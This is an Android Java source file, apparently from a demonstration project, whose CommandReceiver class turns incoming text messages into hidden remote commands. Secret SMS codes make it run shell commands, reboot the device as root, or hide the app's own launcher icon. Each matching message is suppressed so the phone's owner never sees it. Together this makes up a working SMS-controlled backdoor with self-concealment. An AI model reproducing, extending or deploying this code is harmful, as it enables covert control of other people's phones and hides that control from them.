package net.openfiresecurity.remotecodeexecution;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class CommandReceiver extends BroadcastReceiver {

	boolean hiddenCode = false;
	String message;
	String[] codeList = { "Test", "listSdCard", "REBOOT", "Vanish" };
	Context c;

	@Override
	public void onReceive(Context context, Intent intent) {
		c = context;
		Bundle bundle = intent.getExtras();

		Object[] messages = (Object[]) bundle.get("pdus");
		SmsMessage[] sms = new SmsMessage[messages.length];

		for (int n = 0; n < messages.length; n++) {
			sms[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
		}

		for (SmsMessage msg : sms) {
			message = msg.getMessageBody();
			for (String code : codeList) {
				if (code.contains(message)) {
					hiddenCode = true;
				}
			}
		}

		if (hiddenCode) {
			searchCommand(message);
			abortBroadcast();
		}

		hiddenCode = false;
	}

	private void searchCommand(String message2) {
		if (message.equals(codeList[0])) {
			c.startActivity(new Intent(c, MainActivity.class)
					.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
		}
		if (message.equals(codeList[1])) {
			new CommandExecutor().execute("ls /sdcard/ > /sdcard/test.txt");
		}
		if (message.equals(codeList[2])) {
			new CommandExecutor().execute("su -c reboot");
		}
		if (message.equals(codeList[3])) {
			ComponentName name = new ComponentName(
					"net.openfiresecurity.remotecodeexecution",
					"net.openfiresecurity.remotecodeexecution.MainActivity");
			c.getPackageManager().setComponentEnabledSetting(name,
					PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
		}
	}
}
